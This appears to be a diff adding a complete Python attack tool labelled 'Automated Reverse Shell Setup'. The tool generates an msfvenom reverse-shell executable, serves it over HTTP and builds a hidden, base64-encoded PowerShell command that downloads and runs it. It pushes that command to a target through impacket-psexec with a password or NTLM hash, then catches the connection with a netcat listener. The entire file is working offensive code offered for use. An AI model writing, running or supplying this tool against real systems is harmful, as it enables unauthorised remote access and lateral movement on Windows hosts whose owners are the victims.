@@ -1,0 +1,149 @@
+#!/usr/bin/env python3
+import argparse
+import socket
+import subprocess
+import random
+import time
+import os
+import sys
+import requests
+import netifaces
+import ipaddress
+import base64
+from http.server import SimpleHTTPRequestHandler
+from socketserver import TCPServer
+import threading
+
+debug = False
+
+def check_port_in_use(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    result = s.connect_ex((ip, port))
+    s.close()
+    return result == 0
+
+def find_free_port():
+    while True:
+        port = random.randint(49152, 65535)
+        if not check_port_in_use('localhost', port):
+            return port
+        time.sleep(0.1)
+
+def get_external_ip():
+    try:
+        tun_ip = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
+        return tun_ip
+    except ValueError:
+        pass
+    try:
+        response = requests.get('https://api.ipify.org')
+        return response.text
+    except requests.RequestException:
+        print("Unable to fetch external IP address")
+        sys.exit(1)
+
+def generate_powershell_payload(ip, port):
+    command = f"ps-payload {ip} {port}"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if result.returncode != 0:
+        print(f"Error generating payload: {result.stderr}")
+        sys.exit(1)
+    return result.stdout.strip()
+
+def start_listener(ip, port):
+    def run_listener():
+        listener_command = f"rlwrap nc -lvnp {port}"
+        subprocess.call(listener_command, shell=True)
+    thread = threading.Thread(target=run_listener)
+    thread.start()
+    print(f"[*] Listener started on {ip}:{port}")
+    return thread
+
+def start_http_server(port):
+    handler = SimpleHTTPRequestHandler
+    httpd = TCPServer(("", port), handler)
+    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+    thread.start()
+    print(f"Serving /tmp on port {port}...")
+    return httpd
+
+def generate_msfvenom_exe(lhost, lport):
+    exe_path = "/tmp/kallisti.exe"
+    cmd = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {exe_path}"
+    print(f"[+] Generating kallisti.exe with msfvenom...")
+    if debug:
+        print(f"Running: {cmd}")
+        subprocess.run(cmd, shell=True, check=True)
+    else:
+        print("Running psexec - standby...")
+        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    return exe_path
+
+def powershell_base64(command):
+    encoded = command.encode("utf-16le")
+    return base64.b64encode(encoded).decode()
+
+def generate_download_exec_command(lhost, webport):
+    download_url = f"http://{lhost}:{webport}/kallisti.exe"
+    shell_name = f"kallisti_{int(time.time())}.exe"
+    ps = f"$proc = IEX(New-Object Net.WebClient).DownloadFile('{download_url}','C:\\\\windows\\\\temp\\\\{shell_name}'); Start-Process -WindowStyle Hidden -FilePath 'C:\\\\windows\\\\temp\\\\{shell_name}'; $proc.WaitForExit(); Remove-Item 'C:\\\\windows\\\\temp\\\\{shell_name}' -Force"
+    encoded = powershell_base64(ps)
+    return f"powershell -nop -w hidden -noni -ep bypass -enc {encoded}"
+
+def execute_ps_exec(user, password, ip, payload, hashes=None):
+    psexec_command = f"impacket-psexec {user}"
+    if password:
+        psexec_command += f":'{password}'"
+    psexec_command += f"@{ip} '{payload}'"
+    if hashes:
+        psexec_command += f" -hashes :{hashes}"
+    if debug:
+        print(f"Executing: {psexec_command}")
+        subprocess.run(psexec_command, shell=True)
+    else:
+        print("Running psexec - standby...")
+        subprocess.run(psexec_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def main():
+    parser = argparse.ArgumentParser(description="Automated Reverse Shell Setup")
+    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
+    parser.add_argument("-u", "--user", required=True, help="Username")
+    parser.add_argument("-p", "--password", help="Password (if using)", default=None)
+    parser.add_argument("-H", "--hashes", help="NTLM hashes (if using)", default=None)
+    parser.add_argument("--lhost", type=ipaddress.ip_address, help="Local ip for reverse shell (optional, default is detected)", default=None)
+    parser.add_argument("--lport", type=int, help="Local port for reverse shell (optional, default is random)", default=None)
+    parser.add_argument("--debug", action="store_true", help="Enable debug output")
+    parser.add_argument("-s", "--shell", action="store_true", help="Use direct ps-payload reverse shell instead of msfvenom exe")
+    
+    args = parser.parse_args()
+
+    if args.debug:
+        global debug
+        debug = True
+        print(f"Debug: User={args.user}, Password={args.password}, Hashes={args.hashes}, Local Port={args.lport}")
+
+    ip = args.ip
+    host = str(args.lhost if args.lhost else get_external_ip())
+    lport = args.lport if args.lport else find_free_port()
+
+    
+    if args.shell:
+        payload = generate_powershell_payload(host, lport)
+        
+    else:
+        exe_path = generate_msfvenom_exe(host, lport)
+        os.chdir("/tmp")
+        http_port = find_free_port()
+        server = start_http_server(http_port)
+        payload = generate_download_exec_command(host, http_port)
+    
+    try:
+        listener_thread = start_listener(host, lport)
+        execute_ps_exec(args.user, args.password, ip, payload, args.hashes)
+        listener_thread.join()
+    except KeyboardInterrupt:
+        print("exiting...")
+
+if __name__ == "__main__":
+    main()
+
